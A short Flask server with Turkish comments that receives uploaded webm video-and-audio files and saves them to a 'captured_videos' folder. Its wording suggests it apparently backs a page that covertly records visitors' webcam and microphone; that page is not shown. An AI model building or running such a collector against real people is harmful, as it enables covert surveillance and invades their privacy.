from flask import Flask, render_template, request
import os

app = Flask(__name__)

# Videoların kaydedileceği klasörü hazırla
SAVE_PATH = "captured_videos"
if not os.path.exists(SAVE_PATH):
    os.makedirs(SAVE_PATH)

@app.route('/')
def index():
    return render_template('index.html')

# Video dosyalarını alan ana merkez
@app.route('/upload', methods=['POST'])
def upload():
    if 'video' in request.files:
        video_file = request.files['video']
        # Rastgele isimle video kaydet (.webm formatında)
        filename = f"{SAVE_PATH}/video_{os.urandom(4).hex()}.webm"
        video_file.save(filename)
        print(f"\n[+] VİDEO VE SES KAYDEDİLDİ: {filename}")
        return "Başarılı", 200
    return "Hata", 400

if __name__ == '__main__':
    print("\n" + "="*35)
    print("   SİSTEM AKTİF (SES + VİDEO)")
    print(f"   Adres: http://0.0.0.0:5000")
    print("="*35 + "\n")
    app.run(host='0.0.0.0', port=5000)